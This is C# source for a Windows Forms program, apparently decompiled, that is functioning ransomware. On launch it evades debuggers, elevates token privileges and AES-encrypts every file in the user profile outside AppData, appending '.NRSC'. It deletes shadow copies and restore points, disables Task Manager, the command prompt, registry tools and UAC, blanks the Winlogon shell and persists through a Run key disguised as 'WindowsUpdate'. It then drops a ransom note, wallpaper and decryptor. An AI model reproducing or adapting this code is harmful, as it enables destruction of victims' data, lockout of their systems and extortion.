using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NotRansom_StopCtypt;

public class Form1 : Form
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct TOKEN_PRIVILEGES
	{
		public int PrivilegeCount;

		public long Luid;

		public int Attributes;
	}

	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] array = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using MemoryStream memoryStream = new MemoryStream();
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			try
			{
				byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
				byte[] bytes = Encoding.UTF8.GetBytes(password);
				bytes = SHA256.Create().ComputeHash(bytes);
				byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
				File.WriteAllBytes(file, bytes2);
			}
			catch (Exception)
			{
			}
		}
	}

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		using Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void SetReg()
	{
		string value = Path.Combine(Path.GetTempPath(), "WallPaper.jpg");
		string value2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "NTSC_Decryptor.exe");
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\CurrentVersion\\Policies\\system");
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\CurrentVersion\\Policies\\explorer");
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\CurrentVersion\\Policies\\ActiveDesktop");
		RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\CurrentVersion\\Policies\\explorer\\RestrictRun");
		RegistryKey registryKey7 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system");
		RegistryKey registryKey8 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications");
		RegistryKey registryKey9 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\CurrentVersion\\Run");
		registryKey.SetValue("DisableTaskMgr", 1);
		registryKey.SetValue("DisableRegistryTools", 1);
		registryKey.SetValue("DisableMsConfig", 1);
		registryKey.SetValue("WallPaper", value);
		registryKey2.SetValue("NoRun", 1);
		registryKey2.SetValue("NoFind", 1);
		registryKey2.SetValue("NoClose", 1);
		registryKey2.SetValue("NoControlPanel", 1);
		registryKey2.SetValue("NoLogOff", 1);
		registryKey2.SetValue("RestrictRun", 1);
		registryKey3.SetValue("NoChangingWallPaper", 1);
		registryKey4.SetValue("Shell", "");
		registryKey5.SetValue("DisableCMD", 1);
		registryKey6.SetValue("1", "NRSC_Decrypter.exe");
		registryKey6.SetValue("2", "notepad.exe");
		registryKey8.SetValue("ToastEnabled", 0);
		registryKey7.SetValue("EnableLUA", 0);
		registryKey9.SetValue("WindowsUpdate", value2);
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

	public static void AdjustToken1()
	{
		if (Environment.OSVersion.Platform == PlatformID.Win32NT)
		{
			OpenProcessToken(GetCurrentProcess(), 40u, out var TokenHandle);
			TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
			NewState.Attributes = 2;
			NewState.PrivilegeCount = 1;
			LookupPrivilegeValue(null, "SeBackupPrivilege", out NewState.Luid);
			AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges: false, ref NewState, 0, IntPtr.Zero, IntPtr.Zero);
			CloseHandle(TokenHandle);
		}
	}

	public static void AdjustToken()
	{
		if (Environment.OSVersion.Platform == PlatformID.Win32NT)
		{
			OpenProcessToken(GetCurrentProcess(), 40u, out var TokenHandle);
			TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
			NewState.Attributes = 2;
			NewState.PrivilegeCount = 1;
			LookupPrivilegeValue(null, "SeRestorePrivilege", out NewState.Luid);
			AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges: false, ref NewState, 0, IntPtr.Zero, IntPtr.Zero);
			CloseHandle(TokenHandle);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (Debugger.IsAttached)
		{
			Environment.Exit(0);
		}
		AdjustToken();
		AdjustToken1();
		string destFileName = Path.Combine(Path.GetTempPath(), "WallPaper.jpg");
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/c RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.FileName = "cmd.exe";
		processStartInfo2.Arguments = "/c vssadmin delete shadows /all & wmic shadowcopy delete & WMIC /Namespace:\\\\root\\default Path SystemRestore Call Disable \"C:\\\" & FhManagew.exe -cleanup 0 & rd /s /q C:\\Windows.old";
		processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo2.CreateNoWindow = true;
		processStartInfo2.UseShellExecute = false;
		Extract("NotRansom_StopCtypt", folderPath, "Resources", "w.nrsc");
		Extract("NotRansom_StopCtypt", folderPath, "Resources", "d.nrsc");
		Extract("NotRansom_StopCtypt", folderPath, "Resources", "n.nrsc");
		string tempPath = Path.GetTempPath();
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Documents");
		string text2 = Path.Combine(environmentVariable, "Pictures");
		string text3 = Path.Combine(environmentVariable, "Downloads");
		string text4 = Path.Combine(environmentVariable, "videos");
		string text5 = Path.Combine(environmentVariable, "Desktop");
		Path.Combine(tempPath, "WallPaper.bmp");
		Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
		Directory.GetFiles(text5 + "\\", "*", SearchOption.AllDirectories);
		string[] files = Directory.GetFiles(environmentVariable + "\\", "*", SearchOption.AllDirectories);
		string password = "WS32LOCK666";
		EncryptionFile encryptionFile = new EncryptionFile();
		for (int i = 0; i < files.Length; i++)
		{
			try
			{
				if (files[i].IndexOf("AppData", StringComparison.OrdinalIgnoreCase) <= -1 && files[i] != Path.Combine(text5, "w.nrsc") && files[i] != Path.Combine(text5, "d.nrsc") && files[i] != Path.Combine(text5, "n.nrsc"))
				{
					encryptionFile.EncryptFile(files[i], password);
					File.Move(files[i], files[i] + ".NRSC");
				}
			}
			catch (Exception)
			{
			}
		}
		SetReg();
		Process.Start(processStartInfo2);
		Process.Start(processStartInfo);
		Thread.Sleep(1000);
		Process.Start(processStartInfo);
		Thread.Sleep(1000);
		Process.Start(processStartInfo);
		Thread.Sleep(1000);
		Process.Start(processStartInfo);
		Thread.Sleep(1000);
		File.Copy(Path.Combine(folderPath, "d.nrsc"), Path.Combine(folderPath, "NRSC_Decryptor.exe"));
		File.Copy(Path.Combine(folderPath, "n.nrsc"), Path.Combine(folderPath, "note.txt"));
		File.Copy(Path.Combine(folderPath, "w.nrsc"), destFileName);
		Process.Start(Path.Combine(folderPath, "note.txt"));
		Process.Start(Path.Combine(folderPath, "NRSC_Decryptor.exe"));
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
